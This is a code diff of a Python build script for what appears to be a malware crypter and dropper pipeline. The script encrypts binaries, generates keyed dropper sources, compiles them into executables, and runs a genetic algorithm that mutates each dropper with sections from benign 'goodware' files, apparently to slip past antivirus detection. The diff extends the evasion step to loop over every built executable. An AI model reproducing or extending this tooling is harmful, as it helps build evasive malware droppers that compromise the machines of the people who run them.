@@ -8,13 +8,14 @@ import CreateCrypt #creates an encrypt and decrypt function
 # void decryptFile(const std::string& inputFile, const std::string& outputFile, char key)
 #saves to generated/crypt
 from pathlib import Path
-import EnsureGAdockerRunning.py
+import EnsureGAdockerRunning
 import base64
 import CreateDropper
 import GenerateRES
 import BuildExes
-import ../GeneticPart/Genetic.py as Gene
-#make sure all needed folders are here
+from GeneticPart import Genetic as Gene
+
+
 base_dirs = {
     "crypt": "generated/crypt",
     "encrypted_binaries": "generated/encrypted_binaries",
@@ -25,15 +26,14 @@ base_dirs = {
     "base64encrypted":"generated/base64encrypted"
 }
 
-# Ensure all folders exist
 for name, path in base_dirs.items():
     os.makedirs(path, exist_ok=True)
 
-# Clear all folders except 'crypt'
+
 for name, path in base_dirs.items():
     if name == "crypt":
-        continue  # do not clear crypt
-    # Remove all files in the folder
+        continue 
+    
     for f in os.listdir(path):
         file_path = os.path.join(path, f)
         try:
@@ -171,9 +171,29 @@ for rc_file in os.listdir("generated/resfiles"):                                
         CreateDropper.create_dropper(dropper_cpp_path, cpp_file1, cpp_file2, key, key,b64)
 
 BuildExes.build_all("generated/Generated_DropperCPPfiles", "generated/resfiles","generated/finalexes")                    # compile all the droppers with their needed res
-if(genetic):
-    mutatableSections = [101 + i for i in range(1,extragoodware)]
+if(genetic):                                                                                                               # run genetic algo on the droppers if passed as yes
+    final_dir = Path("generated/finalexes")
+    goodware_dir = "../GeneticPart/goodware/"
+
+    mutatableSections = [101 + i for i in range(1, extragoodware)]
     EnsureGAdockerRunning.ensure_container_running()
 
-    Gene.genetic_algo(4,8,exe_path,"../GeneticPart/goodware/",exe_path,mutatableSections)
+    for exe_path in final_dir.glob("*.exe"):
+        print(f"\n=== Running GA on {exe_path.name} ===")
+
+        temp_out = exe_path.with_suffix(".best.exe")
+        best = Gene.genetic_algo(
+            4,                     # popsize
+            8,                     # generations
+            str(exe_path),         # input EXE
+            goodware_dir,          # goodware folder
+            str(temp_out),         # GA output temp file
+            mutatableSections      # masks
+        )
+        if temp_out.exists():
+            print(f"Replacing {exe_path.name} with GA result…")
+            shutil.move(str(temp_out), str(exe_path))
+        else:
+            print(f"ERROR: GA did not produce output for {exe_path.name}")
+
     
